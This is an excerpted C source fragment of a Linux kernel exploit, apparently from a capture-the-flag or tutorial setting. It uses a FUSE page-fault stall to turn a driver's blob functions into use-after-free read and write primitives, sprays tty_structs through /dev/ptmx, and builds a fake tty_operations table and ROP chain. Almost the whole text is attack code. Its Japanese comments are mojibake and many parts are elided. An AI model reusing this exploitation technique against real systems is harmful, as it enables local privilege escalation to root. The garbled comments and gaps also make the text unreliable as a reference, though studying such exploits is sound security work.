...
static int read_callback(const char *path,
  ...
  if (strcmp(path, "/pwn") == 0) {
    switch (fault_cnt++) {
      ...
      case 1:
        puts("[+] UAF read");
        /* [1-2] [2-2] `blob_get`ã�«ã‚ˆã‚‹ãƒšãƒ¼ã‚¸ãƒ•ã‚©ãƒ«ãƒˆ */
        // victimã‚’è§£æ”¾
        del(victim);

        // tty_structã‚’ã‚¹ãƒ—ãƒ¬ãƒ¼ã�—ã€�victimã�®å ´æ‰€ã�«ã�‹ã�¶ã�›ã‚‹
      ...
      case 2:
        puts("[+] UAF write");
        /* [3-2] `blob_set`ã�«ã‚ˆã‚‹ãƒšãƒ¼ã‚¸ãƒ•ã‚©ãƒ«ãƒˆ */
        // å�½tty_operationã‚’spray (ãƒªãƒ¼ã‚¯ã�—ã�Ÿkheapã�«ã�‹ã�¶ã‚‰ã�›ã‚‹)
        for (int i = 0; i < 0x100; i++) {
          add(buf, 0x400);
        }

        // victimã‚’è§£æ”¾ã�—ã€�tty_structã‚’spray
        del(victim);
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        ...
        // ã�“ã�®ãƒšãƒ¼ã‚¸ã�®ãƒ‡ãƒ¼ã‚¿ã‚’æŒ�ã�¤ãƒ�ãƒƒãƒ•ã‚¡ï¼ˆcopy_from_userã�§æ›¸ã��è¾¼ã‚€å†…å®¹ï¼‰
...
void *fuse_thread(void *_arg) {
  ...
  /* ãƒ¡ã‚¤ãƒ³ã‚¹ãƒ¬ãƒƒãƒ‰ã‚’å�Œã�˜CPUã�§å‹•ã�‹ã�™ */
...
int main(int argc, char **argv) {
  ...
  /* ãƒ¡ã‚¤ãƒ³ã‚¹ãƒ¬ãƒƒãƒ‰ã�¨FUSEã‚¹ãƒ¬ãƒƒãƒ‰ã�Œå¿…ã�šå�Œã�˜CPUã�§å‹•ã��ã‚ˆã�†è¨­å®šã�™ã‚‹ */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");
  ...
  /* [1-1] UAF Read: tty_structã�®ãƒªãƒ¼ã‚¯ */
  page = mmap_fuse_file();
  ...
  /* [2-1] UAF Read: tty_structã�®ãƒªãƒ¼ã‚¯ (ãƒ’ãƒ¼ãƒ—) */
  page = mmap_fuse_file();
  victim = add(buf, 0x400);
  ...
  // å�½tty_structå…¼tty_operationsã�®ç”¨æ„�
  ...
  *chain++ = user_ss;
  ...
  /* [3-1] UAF Write: tty_structã�®æ›¸ã��æ�›ã�ˆ */
  page = mmap_fuse_file();
  victim = add(buf, 0x400);
  set(victim, page, 0x400);

  /* æ›¸ã��æ�›ã�ˆã‚‰ã‚Œã�Ÿtty_structã�®åˆ©ç”¨ */
  for (int i = 0; i < 0x10; i++)
